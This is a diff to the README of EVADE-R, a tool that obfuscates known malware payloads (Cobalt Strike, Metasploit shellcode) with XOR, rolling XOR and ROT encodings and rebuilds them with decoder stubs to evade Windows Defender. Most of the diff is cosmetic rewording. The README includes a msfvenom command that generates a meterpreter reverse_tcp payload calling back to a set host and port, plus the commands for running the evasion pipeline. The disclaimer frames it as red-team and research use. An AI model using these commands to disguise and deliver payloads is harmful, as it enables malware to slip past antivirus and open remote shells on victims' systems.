@@ -1,5 +1,5 @@
 <h1 align="center">
-  🛡️ EVADE-R 🧠
+  EVADE-R
 </h1>
 
 <p align="center">
@@ -9,45 +9,45 @@
 
 ---
 
-## 🧬 What It Does
+## What It Does
 
 > Takes a known `.exe` payload → disassembles → obfuscates → recompiles → survives.
 
 **EVADE-R** is an automated toolchain that:
-- 💥 Accepts known malware signatures (e.g., Cobalt Strike, MSF payloads)
-- 🧠 Decompiles and extracts `.text` section shellcode
-- 🌀 Obfuscates shellcode via multiple encoding techniques (XOR, Rolling XOR, ROT)
-- 🧪 Rebuilds a working `.exe` with runtime decoder stubs
-- 🦠 Bypasses Windows Defender with ease
+- Accepts known malware signatures (e.g., Cobalt Strike, MSF payloads)
+- Decompiles and extracts `.text` section shellcode
+- Obfuscates shellcode via multiple encoding techniques (XOR, Rolling XOR, ROT)
+- Rebuilds a working `.exe` with runtime decoder stubs
+- Targets Windows Defender evasion
 
 ---
 
-## 🛠️ Features
+## Features
 
-✅ Shellcode extractor  
-✅ Multiple obfuscation techniques:
+- Shellcode extractor  
+- Multiple obfuscation techniques:
   - Simple XOR encoding with randomized key
   - Rolling XOR with multi-byte keys for enhanced evasion
   - ROT (byte rotation) encoding
-✅ Runtime decoder stub injection  
-✅ Minimal stub loader in C  
-✅ Automated rebuild and output generation
-✅ Command-line interface for automation  
-✅ Support for both EXE and raw shellcode payloads  
-🚧 Looping & VT feedback (coming soon)  
-🚧 Junk injection and instruction substitution (planned)
+- Runtime decoder stub injection  
+- Minimal stub loader in C  
+- Automated rebuild and output generation
+- Command-line interface for automation  
+- Support for both EXE and raw shellcode payloads  
+- Looping & VT feedback (coming soon)  
+- Junk injection and instruction substitution (planned)
 
 ---
 
-## ⚙️ Setup
+## Setup
 
-### 📦 Requirements
+### Requirements
 - Arch Linux (or other distro)
 - `mingw-w64-gcc` (`sudo pacman -S mingw-w64-gcc`)
 - Python 3.10+
 - `capstone`, `lief`, `keystone-engine`
 
-### 🧱 One-Time Install
+### One-Time Install
 
 ```bash
 git clone https://github.com/godofthunder8756/evade-r.git
@@ -55,24 +55,25 @@ cd evade-r
 chmod +x setup.sh run.sh
 ./setup.sh
 ```
-## 🚀 Usage
+## Usage
 
-### 🎯 Generate a detectable payload (example)
+### Generate a detectable payload (example)
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.59 LPORT=4444 -f exe -o payload.exe
-🧼 Transform it with EVADE-R
+```
 
+Transform it with EVADE-R:
+
+```bash
 ./run.sh payload.exe
 ```
 
 This will:
 
-    Extract and XOR-encode the shellcode
-
-    Insert a runtime decoder stub
-
-    Recompile into a new executable
+- Extract and XOR-encode the shellcode
+- Insert a runtime decoder stub
+- Recompile into a new executable
 
 You’ll find the results in:
 ```
@@ -83,7 +84,7 @@ artifacts/
     └── text_section.bin               # Raw extracted .text section shellcode
 ``` 
 
-## 🔒 Ethical Use Only
+## Ethical Use Only
 
 This tool is provided strictly for ethical hacking, research, and red team training purposes.
 Do not use EVADE-R on systems or networks you do not own or have explicit permission to test.
@@ -92,7 +93,7 @@ The creator assumes **no** responsibility for illegal or malicious use.
 
 ---
 
-## 📋 Advanced Usage
+## Advanced Usage
 
 ### Command Line Options
 
@@ -117,6 +118,10 @@ Available options:
   --cleanup             Remove original payload file after obfuscation
   --no-interactive      Run in non-interactive mode with defaults
 ```
+
+Environment variable:
+
+- `EVADE_R_ARCH` (x86/x64) sets the default architecture for raw shellcode runs in `main.py` when stdin is non-interactive.
 
 ### Examples
 
@@ -145,6 +150,6 @@ python msf_session.py -i payload.exe -e 1 --no-interactive --cleanup
    * Alternative encoding method
    * Useful when XOR patterns are flagged
 
-### 🧙 Author
+### Author
 
-  Made with blood, bytes, and broken detections by Aidan Ahern
+  Created by Aidan Ahern
